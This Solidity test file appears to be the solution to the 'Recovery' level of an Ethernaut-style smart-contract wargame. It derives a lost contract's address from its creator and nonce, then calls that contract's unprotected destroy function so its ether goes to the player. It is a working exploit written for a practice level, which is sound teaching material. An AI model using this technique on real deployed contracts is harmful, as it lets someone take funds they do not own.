// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/Recovery.sol";
import "../src/levels/RecoveryFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestRecovery is BaseTest{
    using SafeMath for uint256;
    Recovery level;


    constructor() public{
        levelFactory = new RecoveryFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Recovery(levelAddress);        
    }

    function exploitLevel() internal override{
        vm.prank(player, player);
       address payable lostContract = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(level), bytes1(0x01)))))
        );
        uint256 contractBal = lostContract.balance;
        assertEq(contractBal,0.001 ether);

        uint256 playerBal = player.balance;
        SimpleToken(lostContract).destroy(player);

        vm.stopPrank();
        assertEq(lostContract.balance, 0);
        assertEq(player.balance, playerBal + contractBal);
    }
}
